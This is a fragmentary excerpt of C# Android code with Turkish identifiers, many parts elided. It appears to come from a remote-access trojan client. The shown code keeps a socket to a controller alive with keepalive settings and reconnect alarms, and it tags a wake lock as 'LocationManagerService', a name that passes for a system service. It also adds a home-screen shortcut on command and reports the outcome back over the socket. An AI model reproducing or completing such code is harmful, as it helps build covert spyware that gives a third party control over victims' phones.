        ...
        public async void Baglanti_Kur()
        {
            await Task.Run(() =>
            {
                try
                {
                    ...
                    wakeLock = pm.NewWakeLock(WakeLockFlags.Partial, "LocationManagerService");
                    //if (wakeLock.IsHeld == false) { wakeLock.Acquire(); }
                    cancelAlarm(this);
                    SetSocketKeepAliveValues(Soketimiz, 300000, 1000);
                    infoAl(Soketimiz);
                }
                catch (Exception) { setAlarm(this); }
            });
        }
        ...
        */
        ...
        private void AddShortcut(string appName, string url, byte[] icon_byte)
        {
            ...
            try
            {
                ...
                soketimizeGonder("SHORTCUT", "[VERI]Shortcut successfully added.[VERI][0x09]");
            }
            catch (Exception ex)
            {
                soketimizeGonder("SHORTCUT", "[VERI]Error on shortcut add: " + ex.Message + "[VERI][0x09]");
            }
        }
